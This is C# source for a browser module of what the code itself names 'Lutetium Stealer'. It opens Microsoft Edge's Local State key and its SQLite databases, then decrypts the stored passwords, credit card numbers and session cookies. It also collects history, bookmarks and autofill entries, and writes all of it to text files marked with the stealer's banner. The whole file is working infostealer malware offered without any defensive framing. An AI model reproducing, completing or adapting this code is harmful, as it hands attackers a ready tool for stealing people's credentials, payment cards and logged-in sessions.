using System.Security.Cryptography;
using System.Text;
using System.Data.SQLite;
using Chromium_Decryptor.Modules.Decryption;
using Chromium_Decryptor.Modules.Classes;
using System.Data;
using System.Text.RegularExpressions;

namespace Chromium_Decryptor.Modules
{
    internal class Edge
    {
        public static string fileContent = "";

        public static void Passwords(string LoginDataPath)
        {
            byte[] key = ChromiumDecryptor.GetKey(LoginDataPath + "\\Local State");

            string connectionString = string.Format("Data Source={0};Version=3;", LoginDataPath + "\\Login Data");

            SQLiteConnection conn = new SQLiteConnection(connectionString);
            conn.Open();
            List<Passwords> creds = new List<Passwords>();

            SQLiteCommand cmd = new SQLiteCommand("select * from logins", conn);
            SQLiteDataReader reader = cmd.ExecuteReader();

            while (reader.Read())
            {
                byte[] encryptedData = (byte[])reader["password_value"];
                if (ChromiumDecryptor.IsV10(encryptedData))
                {
                    byte[] nonce, ciphertextTag;
                    ChromiumDecryptor.Prepare(encryptedData, out nonce, out ciphertextTag);
                    string password = ChromiumDecryptor.Decrypt(ciphertextTag, key, nonce);
                    creds.Add(new Passwords
                    {
                        url = reader["origin_url"].ToString(),
                        username = reader["username_value"].ToString(),
                        password = password
                    });
                }
                else
                {
                    string password;
                    try
                    {
                        password = Encoding.UTF8.GetString(ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser));
                    }
                    catch
                    {
                        password = "Decryption failed :(";
                    }
                    creds.Add(new Passwords
                    {
                        url = reader["origin_url"].ToString(),
                        username = reader["username_value"].ToString(),
                        password = password
                    });
                }
            }
            using (StreamWriter writer = new StreamWriter("Edge_Passwords.txt"))
            {
                foreach (Passwords cred in creds)
                {
                    Total.PASSWORDS++;
                    writer.WriteLine("--- Lutetium Stealer ---");
                    writer.WriteLine("Url: {0}", cred.url);
                    writer.WriteLine("Username: {0}", cred.username);
                    writer.WriteLine("Password: {0}", cred.password);
                    writer.WriteLine();
                }
            }
        }
        public static void History(string path)
        {
            using (SQLiteConnection connection = new SQLiteConnection("Data Source=" + path + "\\history"))
            {
                connection.Open();

                using (SQLiteCommand command = new SQLiteCommand("SELECT * FROM urls", connection))
                using (SQLiteDataAdapter adapter = new SQLiteDataAdapter(command))
                {
                    DataTable dataTable = new DataTable();
                    adapter.Fill(dataTable);

                    using (StreamWriter writer = new StreamWriter("Edge_History.txt"))
                    {
                        foreach (DataRow row in dataTable.Rows)
                        {
                            Total.HISTORY++;
                            writer.WriteLine("--- Lutetium Stealer ---");
                            writer.WriteLine("URL: " + row["url"]);
                            writer.WriteLine("Title: " + row["title"]);
                            writer.WriteLine("Visit Count: " + row["visit_count"]);
                            writer.WriteLine();
                        }
                    }
                }
            }
        }
        public static void Bookmarks(string FileContent)
        {
            string pattern = "\"url\": \"(.*?)\"";

            Regex regex = new Regex(pattern);

            MatchCollection matches = regex.Matches(fileContent);

            using (StreamWriter writer = new StreamWriter("Edge_Bookmarks.txt"))
            {
                foreach (Match match in matches)
                {
                    Total.BOOKMARKS++;
                    string url = match.Groups[1].Value;
                    writer.WriteLine("--- Lutetium Stealer ---");
                    writer.WriteLine(url);
                    writer.WriteLine();
                }
            }
        }
        public static void AutoFill(string databasePath)
        {
            using (SQLiteConnection connection = new SQLiteConnection("Data Source=" + databasePath + "\\Web Data"))
            {
                connection.Open();

                using (SQLiteCommand command = new SQLiteCommand("SELECT * FROM autofill", connection))
                using (SQLiteDataAdapter adapter = new SQLiteDataAdapter(command))
                {
                    DataTable dataTable = new DataTable();
                    adapter.Fill(dataTable);
                    using (StreamWriter writer = new StreamWriter("Edge_Autofill.txt"))
                    {
                        foreach (DataRow row in dataTable.Rows)
                        {
                            Total.AUTOFILLS++;
                            writer.WriteLine("--- Lutetium Stealer ---");
                            writer.WriteLine("Name:" + row["name"]);
                            writer.WriteLine("Title: " + row["value"]);
                            writer.WriteLine();
                        }
                    }
                }
            }
        }
        public static void CreditCards(string databasePath)
        {
            byte[] key = ChromiumDecryptor.GetKey(databasePath + "\\Local State");

            string connectionString = String.Format("Data Source={0};Version=3;", databasePath + "\\Web Data");

            SQLiteConnection conn = new SQLiteConnection(connectionString);
            conn.Open();
            List<CreditCards> creds = new List<CreditCards>();

            SQLiteCommand cmd = new SQLiteCommand("SELECT * FROM credit_cards", conn);
            SQLiteDataReader reader = cmd.ExecuteReader();

            while (reader.Read())
            {
                byte[] encryptedData = (byte[])reader["card_number_encrypted"];
                if (ChromiumDecryptor.IsV10(encryptedData))
                {
                    byte[] nonce, ciphertextTag;
                    ChromiumDecryptor.Prepare(encryptedData, out nonce, out ciphertextTag);
                    string creditcard1 = ChromiumDecryptor.Decrypt(ciphertextTag, key, nonce);
                    creds.Add(new CreditCards
                    {
                        Name = reader["name_on_card"].ToString(),
                        ExpiryMonth = reader["expiration_month"].ToString(),
                        ExpiryYear = reader["expiration_year"].ToString(),
                        CreditCardNumber = creditcard1
                    });
                }
                else
                {
                    string password;
                    try
                    {
                        password = Encoding.UTF8.GetString(ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser));
                    }
                    catch
                    {
                        password = "Decryption failed :(";
                    }
                    creds.Add(new CreditCards
                    {
                        Name = reader["name_on_card"].ToString(),
                        ExpiryMonth = reader["expiration_month"].ToString(),
                        ExpiryYear = reader["expiration_year"].ToString(),
                        CreditCardNumber = password
                    });
                }
            }
            using (StreamWriter writer = new StreamWriter("Edge_CreditCards.txt"))
            {
                foreach (CreditCards cred in creds)
                {
                    Total.CCS++;   
                    writer.WriteLine("--- Lutetium Stealer ---");
                    writer.WriteLine("Name: {0}", cred.Name);
                    writer.WriteLine("Month: {0}", cred.ExpiryMonth);
                    writer.WriteLine("Year Expiry: {0}", cred.ExpiryYear);
                    writer.WriteLine("Credit Card Number: {0}", cred.CreditCardNumber);
                    writer.WriteLine();
                }
            }
        }
        public static void Cookies(string databasePath)
        {
            byte[] key = ChromiumDecryptor.GetKey(databasePath + "\\Local State");

            string connectionString = String.Format("Data Source={0};Version=3;", databasePath + "\\Network\\Cookies");

            SQLiteConnection conn = new SQLiteConnection(connectionString);
            conn.Open();
            List<Cookies> creds = new List<Cookies>();

            SQLiteCommand cmd = new SQLiteCommand("SELECT * FROM cookies", conn);
            SQLiteDataReader reader = cmd.ExecuteReader();

            while (reader.Read())
            {
                byte[] encryptedData = (byte[])reader["encrypted_value"];
                if (ChromiumDecryptor.IsV10(encryptedData))
                {
                    byte[] nonce, ciphertextTag;
                    ChromiumDecryptor.Prepare(encryptedData, out nonce, out ciphertextTag);
                    string creditcard1 = ChromiumDecryptor.Decrypt(ciphertextTag, key, nonce);
                    creds.Add(new Cookies
                    {
                        Name = reader["name"].ToString(),
                        HostKey = reader["host_key"].ToString(),
                        EncryptedValue = creditcard1
                    });
                }
                else
                {
                    string password;
                    try
                    {
                        password = Encoding.UTF8.GetString(ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser));
                    }
                    catch
                    {
                        password = "Decryption failed :(";
                    }
                    creds.Add(new Cookies
                    {
                        Name = reader["name"].ToString(),
                        HostKey = reader["host_key"].ToString(),
                        EncryptedValue = password
                    });
                }
            }
            using (StreamWriter writer = new StreamWriter("Edge_Cookies.txt"))
            {
                foreach (Cookies cred in creds)
                {
                    Total.COOKIES++;
                    writer.WriteLine(cred.HostKey + " " + cred.EncryptedValue);
                }
            }
        }
    }
}
